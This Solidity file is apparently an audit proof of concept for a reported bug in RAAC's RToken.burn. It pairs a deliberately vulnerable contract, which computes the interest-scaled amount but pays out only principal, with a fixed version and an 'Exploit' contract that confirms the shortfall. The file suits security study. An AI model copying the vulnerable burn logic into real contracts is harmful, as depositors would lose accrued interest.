// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  RAAC RToken.burn (Codehawks, February 2025)
    burn computes amountScaled = amount.rayMul(index) and then ignores it.
    The burn and the underlying transfer both use `amount`. A depositor who
    is owed 2000 at liquidity index 2e27 is paid the original 1000. The other
    1000 of interest stays in the token contract.
*/

contract Asset {
    string public symbol = "crvUSD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract RToken {
    uint256 internal constant RAY = 1e27;
    Asset public immutable asset;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => uint256) public userIndex;
    uint256 public amountScaledSeen;

    constructor(Asset _asset) {
        asset = _asset;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function rayMul(uint256 a, uint256 b) public pure returns (uint256) {
        return (a * b + RAY / 2) / RAY;
    }

    function burn(address from, address receiverOfUnderlying, uint256 amount, uint256 index)
        external
        returns (uint256, uint256, uint256)
    {
        if (amount == 0) {
            return (0, totalSupply, 0);
        }
        uint256 userBalance = balanceOf[from];
        userIndex[from] = index;
        if (amount > userBalance) {
            amount = userBalance;
        }
        uint256 amountScaled = rayMul(amount, index);
        amountScaledSeen = amountScaled;
        userIndex[from] = index;
        _burn(from, amount);
        if (receiverOfUnderlying != address(this)) {
            // @> VULN: the underlying paid is `amount`, not `amountScaled`, so accrued interest is not transferred
            asset.transfer(receiverOfUnderlying, amount);
        }
        return (amount, totalSupply, amount);
    }

    function _burn(address from, uint256 amount) internal {
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }
}

contract RTokenFixed {
    uint256 internal constant RAY = 1e27;
    Asset public immutable asset;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(Asset _asset) {
        asset = _asset;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function burn(address from, address receiverOfUnderlying, uint256 amount, uint256 index)
        external
        returns (uint256, uint256, uint256)
    {
        uint256 amountScaled = (amount * index + RAY / 2) / RAY;
        if (amount > balanceOf[from]) amount = balanceOf[from];
        balanceOf[from] -= amount;
        totalSupply -= amount;
        if (receiverOfUnderlying != address(this)) {
            asset.transfer(receiverOfUnderlying, amountScaled);
        }
        return (amountScaled, totalSupply, amountScaled);
    }
}

contract Exploit {
    uint256 public constant DEPOSIT = 1000 ether;
    uint256 public constant INDEX = 2e27;
    Asset public asset;
    RToken public rtoken;
    uint256 public received;
    uint256 public scaled;
    uint256 public stuck;

    constructor() {
        asset = new Asset();
        rtoken = new RToken(asset);
        rtoken.mint(address(this), DEPOSIT);
        asset.mint(address(rtoken), DEPOSIT * 2);
    }

    function run() external {
        (uint256 paid,,) = rtoken.burn(address(this), address(this), DEPOSIT, INDEX);
        received = paid;
        scaled = rtoken.amountScaledSeen();
        stuck = asset.balanceOf(address(rtoken));
        require(scaled == 2000 ether, "interest included in scaled amount");
        require(received == DEPOSIT, "paid only principal");
        require(received < scaled, "no shortfall");
        require(stuck == DEPOSIT, "interest stuck");
        require(asset.balanceOf(address(this)) == DEPOSIT, "user balance");
    }
}
